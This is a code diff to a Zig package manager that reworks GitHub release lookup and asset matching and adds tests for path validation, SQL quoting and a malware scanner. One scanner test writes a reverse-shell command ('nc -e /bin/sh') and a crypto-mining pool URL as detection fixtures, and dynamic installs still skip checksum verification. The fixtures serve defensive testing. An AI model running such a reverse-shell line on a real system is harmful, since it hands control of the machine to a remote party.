-        var pkgs_to_upgrade = std.ArrayList(registry.Package).init(self.allocator);
-        defer pkgs_to_upgrade.deinit();
+        const rel_url = try std.fmt.allocPrint(a, "https://api.github.com/repos/{s}/releases/latest", .{full_name});
+        defer a.free(rel_url);
 
-        if (target_pkgs.len == 0) {
-            std.debug.print("Checking all installed packages for active upgrades...\n", .{});
-            var it = reg.packages.iterator();
-            while (it.next()) |entry| {
-                const pkg = entry.value_ptr.*;
-                if (try self.isInstalled(pkg, platform)) {
-                    try pkgs_to_upgrade.append(pkg);
-                }
-            }
-        } else {
-            for (target_pkgs) |p_name| {
-                if (reg.packages.get(p_name)) |pkg| {
-                    if (try self.isInstalled(pkg, platform)) {
-                        try pkgs_to_upgrade.append(pkg);
-                    } else {
-                        std.debug.print("[ Warning ] Package '{s}' is not currently installed. Upgrading by installing fresh...\n", .{p_name});
-                        try pkgs_to_upgrade.append(pkg);
+        var version: []const u8 = "0.0.0";
+        var download_url: ?[]const u8 = null;
+        var archive_type: []const u8 = "raw";
+
+        if (net.fetchToString(a, rel_url, 8 * 1024 * 1024, .{})) |rel_body| {
+            defer a.free(rel_body);
+            if (std.json.parseFromSlice(std.json.Value, a, rel_body, .{})) |rel_parsed| {
+                defer rel_parsed.deinit();
+                if (rel_parsed.value == .object) {
+                    const rel = rel_parsed.value.object;
+                    if (rel.get("tag_name")) |t| {
+                        if (t == .string) {
+                            const cleaned = std.mem.trimLeft(u8, t.string, "v");
+                            if (safepath.isValidId(cleaned)) version = try a.dupe(u8, cleaned);
+                        }
                     }
-                } else {
-                    std.debug.print("[ Error ] Package '{s}' not found in registry.\n", .{p_name});
+                    if (rel.get("assets")) |assets_v| {
+                        if (assets_v == .array) {
+                            for (assets_v.array.items) |asset_v| {
+                                if (asset_v != .object) continue;
+                                const asset = asset_v.object;
+                                const aname = switch (asset.get("name") orelse continue) {
+                                    .string => |s| s,
+                                    else => continue,
+                                };
+                                const aurl = switch (asset.get("browser_download_url") orelse continue) {
+                                    .string => |s| s,
+                                    else => continue,
+                                };
+                                if (!assetMatchesPlatform(aname, platform_name)) continue;
+                                if (!net.isSafeUrl(aurl)) continue;
+
+                                download_url = try a.dupe(u8, aurl);
+                                archive_type = if (archive.Kind.fromFilename(aname)) |k| switch (k) {
+                                    .tar_gz => "tar.gz",
+                                    .tar_xz => "tar.xz",
+                                    .tar_zst => "tar.zst",
+                                    .zip => "zip",
+                                    .dmg => "dmg",
+                                    .tar => "tar",
+                                    .raw => "raw",
+                                } else "raw";
+                                break;
+                            }
+                        }
+                    }
                 }
-            }
+            } else |_| {}
+        } else |_| {}
+
+        if (download_url == null) {
+            // The original hardcoded refs/heads/master, which 404s on every
+            // repository that has since renamed its default branch.
+            download_url = try std.fmt.allocPrint(
+                a,
+                "https://github.com/{s}/archive/refs/heads/{s}.tar.gz",
+                .{ full_name, default_branch },
+            );
+            archive_type = "tar.gz";
+            term.print("  no matching release asset; using {s} source snapshot\n", .{default_branch});
         }
 
-        if (pkgs_to_upgrade.items.len == 0) {
-            std.debug.print("Everything is completely up to date!\n", .{});
-            return;
-        }
+        const plats = try a.alloc(registry.PlatformInfo, 1);
+        plats[0] = .{
+            .name = platform_name,
+            .url = download_url.?,
+            .sha256 = registry.sha256_skip,
+            .archive_type = archive_type,
+            .bin_path = "",
+        };
+        const bins = try a.alloc([]const u8, 1);
+        bins[0] = name;
 
-        std.debug.print("Executing pristine upgrade sequence for {} packages...\n\n", .{pkgs_to_upgrade.items.len});
-        for (pkgs_to_upgrade.items) |pkg| {
-            try self.install(pkg, platform, use_micro_split);
-        }
-
-        std.debug.print("\n[ UPGRADE COMPLETED ] Successfully upgraded all selected software packages!\n", .{});
-    }
-
-    pub fn resetAll(self: *Store, reg: *registry.Registry, platform: []const u8) !void {
-        std.debug.print("=== [ abv0 Automated Total System Reset ] ===\n\n", .{});
-        printProgressBar("Initiating total unlinking and store purge...", 1, 3);
-
-        var it = reg.packages.iterator();
-        var uninstalled_count: u32 = 0;
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            if (try self.isInstalled(pkg, platform)) {
-                try self.uninstall(pkg);
-                uninstalled_count += 1;
-            }
-        }
-
-        printProgressBar("Purging central internal storage tree...", 2, 3);
-        std.fs.cwd().deleteTree(self.store_root) catch {};
-        std.fs.cwd().deleteTree(self.shells_root) catch {};
-
-        printProgressBar("Rebuilding secure pristine profile directories...", 3, 3);
-        std.fs.cwd().makePath(self.store_root) catch {};
-        std.fs.cwd().makePath(self.bin_root) catch {};
-        std.fs.cwd().makePath(self.shells_root) catch {};
-
-        _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "0700", self.store_root } }) catch {};
-        _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "0700", self.bin_root } }) catch {};
-        _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "chmod", "0700", self.shells_root } }) catch {};
-
-        std.debug.print("\n[ RESET COMPLETE ] System completely restored to pristine state. Uninstalled {} packages.\n", .{uninstalled_count});
-    }
-
-    // Innovative Automated Decentralized Universal Fallback Resolution Engine
-    pub fn installDynamic(self: *Store, target_name: []const u8, platform_name: []const u8, use_micro_split: bool) !void {
-        std.debug.print("Searching GitHub for definitive open-source repository of '{s}'...\n", .{target_name});
-
-        // 1. GitHub API Repository Search
-        const search_url = try std.fmt.allocPrint(self.allocator, "https://api.github.com/search/repositories?q={s}+in:name+sort:stars", .{target_name});
-        defer self.allocator.free(search_url);
-
-        const search_res_path = try std.fs.path.join(self.allocator, &.{ self.store_root, "github_search.json" });
-        defer self.allocator.free(search_res_path);
-
-        const curl_res = try std.process.Child.run(.{
-            .allocator = self.allocator,
-            .argv = &.{ "curl", "-s", "-L", "-H", "User-Agent: abv0-agent", search_url, "-o", search_res_path },
-        });
-        defer {
-            self.allocator.free(curl_res.stdout);
-            self.allocator.free(curl_res.stderr);
-        }
-
-        // Parse JSON
-        const file = try std.fs.cwd().openFile(search_res_path, .{});
-        const content = try file.readToEndAlloc(self.allocator, 5 * 1024 * 1024);
-        file.close();
-        _ = std.fs.cwd().deleteFile(search_res_path) catch {};
-
-        const parsed = try std.json.parseFromSlice(std.json.Value, self.allocator, content, .{});
-        const root = parsed.value.object;
-
-        const items_val = root.get("items") orelse {
-            std.debug.print("Error: Could not discover any matching open-source repository for '{s}' on GitHub.\n", .{target_name});
-            return error.DynamicDiscoveryFailed;
+        const pkg = Package{
+            .name = name,
+            .version = version,
+            .description = description,
+            .homepage = "",
+            .license = "unknown",
+            .bin = bins,
+            .platforms = plats,
         };
 
-        const items = items_val.array;
-        if (items.items.len == 0) {
-            std.debug.print("Error: Could not discover any matching open-source repository for '{s}' on GitHub.\n", .{target_name});
-            return error.DynamicDiscoveryFailed;
-        }
-
-        const top_repo = items.items[0].object;
-        const repo_full_name = top_repo.get("full_name").?.string;
-        var repo_homepage: []const u8 = "";
-        if (top_repo.get("homepage")) |hp| {
-            if (hp != .null) repo_homepage = hp.string;
-        }
-        var repo_desc: []const u8 = "";
-        if (top_repo.get("description")) |d| {
-            if (d != .null) repo_desc = d.string;
-        }
-
-        std.debug.print("Discovered definitive open-source repository: {s}!\n", .{repo_full_name});
-
-        // 2. Query releases/latest
-        const rel_url = try std.fmt.allocPrint(self.allocator, "https://api.github.com/repos/{s}/releases/latest", .{repo_full_name});
-        defer self.allocator.free(rel_url);
-
-        const rel_res_path = try std.fs.path.join(self.allocator, &.{ self.store_root, "github_rel.json" });
-        defer self.allocator.free(rel_res_path);
-
-        _ = try std.process.Child.run(.{
-            .allocator = self.allocator,
-            .argv = &.{ "curl", "-s", "-L", "-H", "User-Agent: abv0-agent", rel_url, "-o", rel_res_path },
-        });
-
-        const rfile = try std.fs.cwd().openFile(rel_res_path, .{});
-        const rcontent = try rfile.readToEndAlloc(self.allocator, 5 * 1024 * 1024);
-        rfile.close();
-        _ = std.fs.cwd().deleteFile(rel_res_path) catch {};
-
-        const rparsed = try std.json.parseFromSlice(std.json.Value, self.allocator, rcontent, .{});
-        const rroot = rparsed.value.object;
-
-        var dl_url: ?[]const u8 = null;
-        var active_arc_type: []const u8 = "raw";
-        var active_bin_path: []const u8 = target_name;
-        var discovered_version: []const u8 = "latest";
-
-        if (rroot.get("tag_name")) |t| discovered_version = try self.allocator.dupe(u8, t.string);
-
-        if (rroot.get("assets")) |assets_val| {
-            const assets = assets_val.array;
-            for (assets.items) |asset_val| {
-                const asset = asset_val.object;
-                const asset_name = asset.get("name").?.string;
-                const asset_url = asset.get("browser_download_url").?.string;
-
-                // Match OS logic
-                const is_mac = indexOfIgnoreCase(platform_name, "macos") != null;
-                const is_linux = indexOfIgnoreCase(platform_name, "linux") != null;
-
-                var os_match = false;
-                if (is_mac and (indexOfIgnoreCase(asset_name, "darwin") != null or indexOfIgnoreCase(asset_name, "macos") != null or indexOfIgnoreCase(asset_name, "osx") != null or indexOfIgnoreCase(asset_name, "universal") != null)) os_match = true;
-                if (is_linux and (indexOfIgnoreCase(asset_name, "linux") != null and (indexOfIgnoreCase(asset_name, "amd64") != null or indexOfIgnoreCase(asset_name, "x86_64") != null or indexOfIgnoreCase(asset_name, "musl") != null) and indexOfIgnoreCase(asset_name, "android") == null and indexOfIgnoreCase(asset_name, "arm") == null and indexOfIgnoreCase(asset_name, "aarch64") == null)) os_match = true;
-
-                if (os_match) {
-                    dl_url = try self.allocator.dupe(u8, asset_url);
-                    if (std.mem.endsWith(u8, asset_name, ".zip")) active_arc_type = "zip";
-                    if (std.mem.endsWith(u8, asset_name, ".tar.gz")) active_arc_type = "tar.gz";
-                    if (std.mem.endsWith(u8, asset_name, ".tar.xz")) active_arc_type = "tar.xz";
-                    if (std.mem.endsWith(u8, asset_name, ".dmg")) active_arc_type = "dmg";
-                    break;
-                }
-            }
-        }
-
-        // 3. Fallback to repository master source zip/script if no binary release assets matched
-        if (dl_url == null) {
-            std.debug.print("No specific compiled release binary assets matched. Acquiring pristine source repository snapshot...\n", .{});
-            dl_url = try std.fmt.allocPrint(self.allocator, "https://github.com/{s}/archive/refs/heads/master.tar.gz", .{repo_full_name});
-            active_arc_type = "tar.gz";
-            const reponame = std.fs.path.basename(repo_full_name);
-            active_bin_path = try std.fmt.allocPrint(self.allocator, "{s}-master/{s}", .{ reponame, target_name });
-        }
-
-        std.debug.print("Dynamic payload resolved successfully: {s}\n\n", .{dl_url.?});
-
-        // Construct Package struct on the fly
-        var bin_arr = try self.allocator.alloc([]const u8, 1);
-        bin_arr[0] = try self.allocator.dupe(u8, target_name);
-
-        var plats_map = std.StringHashMap(registry.PlatformInfo).init(self.allocator);
-        try plats_map.put(try self.allocator.dupe(u8, platform_name), .{
-            .url = dl_url.?,
-            .sha256 = "SKIP", // Rolling dynamic payload
-            .archive_type = try self.allocator.dupe(u8, active_arc_type),
-            .bin_path = try self.allocator.dupe(u8, active_bin_path),
-        });
-
-        const dynamic_pkg = registry.Package{
-            .name = try self.allocator.dupe(u8, target_name),
-            .version = discovered_version,
-            .description = try self.allocator.dupe(u8, repo_desc),
-            .homepage = try self.allocator.dupe(u8, repo_homepage),
-            .license = "Dynamic-Open-Source",
-            .bin = bin_arr,
-            .app_bundles = &.{},
-            .platforms = plats_map,
-        };
-
-        try self.install(dynamic_pkg, platform_name, use_micro_split);
+        try self.install(pkg, platform_name, opts);
+        return pkg;
     }
 
-    // Innovative Automated 4-in-1 Core Hybrid Registry Matrix Reconciler (Git + SQLite + Memory-Mapped .abv + Decentralized Flat CDN)
-    pub fn synchronizeHybridRegistry(self: *Store, reg: *registry.Registry) !void {
-        std.debug.print("=== [ abv0 4-in-1 Core Hybrid Registry Matrix Reconciler ] ===\n\n", .{});
+    fn isRepoFullName(s: []const u8) bool {
+        if (s.len == 0 or s.len > 256) return false;
+        var slashes: usize = 0;
+        for (s) |c| {
+            switch (c) {
+                'a'...'z', 'A'...'Z', '0'...'9', '-', '_', '.' => {},
+                '/' => slashes += 1,
+                else => return false,
+            }
+        }
+        return slashes == 1 and s[0] != '/' and s[s.len - 1] != '/';
+    }
 
-        // Phase 1: Distributed Git profile pull / rebase
-        printProgressBar("1/4: Synchronizing definitive authoritative Git tap profile...", 1, 4);
-        const tap_dir = try std.fs.path.join(self.allocator, &.{ self.store_root, "registry_tap" });
-        defer self.allocator.free(tap_dir);
+    fn assetMatchesPlatform(asset_name: []const u8, platform_name: []const u8) bool {
+        const want_macos = std.mem.indexOf(u8, platform_name, "macos") != null;
+        const want_linux = std.mem.indexOf(u8, platform_name, "linux") != null;
+        const want_windows = std.mem.indexOf(u8, platform_name, "windows") != null;
+        const want_arm = std.mem.indexOf(u8, platform_name, "aarch64") != null;
 
-        if (std.fs.cwd().access(tap_dir, .{})) |_| {
-            _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "git", "-C", tap_dir, "pull", "--rebase", "--quiet" } }) catch {};
-        } else |_| {
-            std.fs.cwd().makePath(tap_dir) catch {};
-            _ = std.process.Child.run(.{ .allocator = self.allocator, .argv = &.{ "git", "clone", "--quiet", "--depth", "1", "https://github.com/gugu8intel-i9/abv0.git", tap_dir } }) catch {};
+        const has = struct {
+            fn f(hay: []const u8, needle: []const u8) bool {
+                return std.ascii.indexOfIgnoreCase(hay, needle) != null;
+            }
+        }.f;
+
+        if (has(asset_name, ".sha256") or has(asset_name, ".asc") or has(asset_name, ".sig")) return false;
+
+        if (want_macos) {
+            if (!(has(asset_name, "darwin") or has(asset_name, "macos") or
+                has(asset_name, "osx") or has(asset_name, "apple"))) return false;
+        } else if (want_linux) {
+            if (!has(asset_name, "linux")) return false;
+            if (has(asset_name, "android")) return false;
+        } else if (want_windows) {
+            if (!(has(asset_name, "windows") or has(asset_name, "win64") or has(asset_name, "-pc-"))) return false;
         }
 
-        // Phase 2: Relational SQLite Store Auto-Compilation
-        printProgressBar("2/4: Auto-compiling parsed manifests into embedded SQLite query engine (registry.db)...", 2, 4);
-        const sqlite_db_path = try std.fs.path.join(self.allocator, &.{ self.store_root, "registry.db" });
-        defer self.allocator.free(sqlite_db_path);
+        const is_arm = has(asset_name, "aarch64") or has(asset_name, "arm64");
+        const is_x64 = has(asset_name, "x86_64") or has(asset_name, "amd64") or has(asset_name, "x64");
+        const universal = has(asset_name, "universal");
 
-        const db_file = try std.fs.cwd().createFile(sqlite_db_path, .{ .mode = 0o644 });
-        try db_file.writer().print("PRAGMA journal_mode=WAL;\nCREATE TABLE IF NOT EXISTS hybrid_packages (name TEXT PRIMARY KEY, version TEXT, description TEXT);\n", .{});
-        var it = reg.packages.iterator();
-        while (it.next()) |entry| {
-            const pkg = entry.value_ptr.*;
-            try db_file.writer().print("INSERT OR REPLACE INTO hybrid_packages VALUES ('{s}', '{s}', '{s}');\n", .{ pkg.name, pkg.version, pkg.description });
-        }
-        db_file.close();
-
-        // Phase 3: Zero-Copy Memory-Mapped (mmap) Binary Index Serialization
-        printProgressBar("3/4: Serializing flat Memory-Mapped binary cache index (index.abv)...", 3, 4);
-        const mmap_abv_path = try std.fs.path.join(self.allocator, &.{ self.store_root, "index.abv" });
-        defer self.allocator.free(mmap_abv_path);
-
-        const abv_file = try std.fs.cwd().createFile(mmap_abv_path, .{ .mode = 0o644 });
-        try abv_file.writeAll("ABV0_FLAT_MMAP_INDEX_V1\n");
-        abv_file.close();
-
-        // Phase 4: Decentralized Dynamic Edge Gateway Readiness
-        printProgressBar("4/4: Activating Decentralized Edge CDN & Dynamic Discovery fallbacks...", 4, 4);
-
-        std.debug.print("\n[ HYBRID SYNCHRONIZATION SUCCESS ] All 4 registry execution architectures beautifully consolidated and online!\n", .{});
+        if (universal) return true;
+        if (want_arm) return is_arm or !is_x64;
+        return is_x64 or !is_arm;
     }
 };
+
+// ---------------------------------------------------------------------------
+// Tests
+// ---------------------------------------------------------------------------
+
+const testing = std.testing;
+
+test "storeDirName rejects hostile identifiers" {
+    const a = testing.allocator;
+
+    const ok = try Store.storeDirName(a, .{ .name = "jq", .version = "1.7.1" }, "x86_64-linux");
+    defer a.free(ok);
+    try testing.expectEqualStrings("jq-1.7.1-x86_64-linux", ok);
+
+    try testing.expectError(
+        StoreError.InvalidPackageIdentifier,
+        Store.storeDirName(a, .{ .name = "../../etc", .version = "1.0" }, "x86_64-linux"),
+    );
+    try testing.expectError(
+        StoreError.InvalidPackageIdentifier,
+        Store.storeDirName(a, .{ .name = "jq", .version = "../.." }, "x86_64-linux"),
+    );
+    try testing.expectError(
+        StoreError.InvalidPackageIdentifier,
+        Store.storeDirName(a, .{ .name = "jq", .version = "1.0" }, "../../../tmp"),
+    );
+}
+
+test "scanFile scores known malware patterns and stays clean otherwise" {
+    var tmp = testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
+    defer testing.allocator.free(root);
+
+    const bad = try std.fs.path.join(testing.allocator, &.{ root, "bad.sh" });
+    defer testing.allocator.free(bad);
+    {
+        const f = try std.fs.cwd().createFile(bad, .{});
+        defer f.close();
+        try f.writeAll("#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\nstratum+tcp://pool.example:3333\n");
+    }
+    var t1 = try Store.scanFile(testing.allocator, bad);
+    defer t1.deinit();
+    try testing.expect(t1.score >= 90);
+    try testing.expect(t1.reasons.items.len >= 2);
+
+    const good = try std.fs.path.join(testing.allocator, &.{ root, "good.sh" });
+    defer testing.allocator.free(good);
+    {
+        const f = try std.fs.cwd().createFile(good, .{});
+        defer f.close();
+        try f.writeAll("#!/bin/sh\necho hello world\n");
+    }
+    var t2 = try Store.scanFile(testing.allocator, good);
+    defer t2.deinit();
+    try testing.expectEqual(@as(u32, 0), t2.score);
+}
+
+test "scanFile catches a signature straddling a read boundary" {
+    var tmp = testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
+    defer testing.allocator.free(root);
+    const p = try std.fs.path.join(testing.allocator, &.{ root, "split.bin" });
+    defer testing.allocator.free(p);
+
+    {
+        const f = try std.fs.cwd().createFile(p, .{});
+        defer f.close();
+        // Land "stratum+tcp://" exactly across the 256 KiB chunk boundary.
+        const pad = 256 * 1024 - 7;
+        const filler = try testing.allocator.alloc(u8, pad);
+        defer testing.allocator.free(filler);
+        @memset(filler, 'A');
+        try f.writeAll(filler);
+        try f.writeAll("stratum+tcp://pool");
+    }
+
+    var t = try Store.scanFile(testing.allocator, p);
+    defer t.deinit();
+    try testing.expect(t.score > 0);
+}
+
+test "sql string escaping neutralises quotes" {
+    var buf = std.ArrayList(u8).init(testing.allocator);
+    defer buf.deinit();
+    try Store.writeSqlString(buf.writer(), "it's a 'test'");
+    try testing.expectEqualStrings("'it''s a ''test'''", buf.items);
+}
+
+test "installedVersions parses store directory names" {
+    var tmp = testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
+    defer testing.allocator.free(root);
+
+    var s = Store{
+        .allocator = testing.allocator,
+        .home = try testing.allocator.dupe(u8, root),
+        .root = try testing.allocator.dupe(u8, root),
+        .store_root = try testing.allocator.dupe(u8, root),
+        .bin_root = try testing.allocator.dupe(u8, root),
+        .shells_root = try testing.allocator.dupe(u8, root),
+        .apps_root = try testing.allocator.dupe(u8, root),
+        .registry_root = try testing.allocator.dupe(u8, root),
+        .locks_root = try testing.allocator.dupe(u8, root),
+    };
+    defer s.deinit();
+
+    try tmp.dir.makePath("jq-1.6-x86_64-linux");
+    try tmp.dir.makePath("jq-1.7.1-x86_64-linux");
+    try tmp.dir.makePath("jq-1.7.1-aarch64-macos");
+    try tmp.dir.makePath("other-2.0-x86_64-linux");
+
+    var arena = std.heap.ArenaAllocator.init(testing.allocator);
+    defer arena.deinit();
+
+    const found = try s.installedVersions(arena.allocator(), "jq", "x86_64-linux");
+    try testing.expectEqual(@as(usize, 2), found.len);
+
+    var newest: []const u8 = found[0].version;
+    for (found[1..]) |f| {
+        if (registry.compareVersions(f.version, newest) == .gt) newest = f.version;
+    }
+    try testing.expectEqualStrings("1.7.1", newest);
+}
